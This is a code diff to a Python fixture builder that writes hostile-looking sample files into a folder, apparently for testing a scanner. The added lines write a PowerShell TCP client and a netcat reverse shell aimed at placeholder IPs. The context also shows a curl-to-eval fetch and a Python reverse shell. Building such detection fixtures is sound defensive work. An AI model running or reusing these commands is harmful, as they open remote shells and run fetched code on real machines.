@@ -245,6 +245,9 @@ def build_folder(root):
                        b"{type:'application/octet-stream'});var a=document.createElement('a');"
                        b"a.href=URL.createObjectURL(b);a.click();</script></html>")
     w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
+    w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
+                        b"$s = $c.GetStream()\n")
+    w("ncshell.sh", b"#!/bin/sh\nnc -e /bin/sh 2.2.2.2 9001\n")
     w("rev.py", b"import socket,os,subprocess\ns=socket.socket(2,1)\n"
                  b"s.connect(('7.7.7.7',9001))\nfor f in (0,1,2): os.dup2(s.fileno(),f)\n"
                  b"subprocess.call(['/bin/sh','-i'])\n")
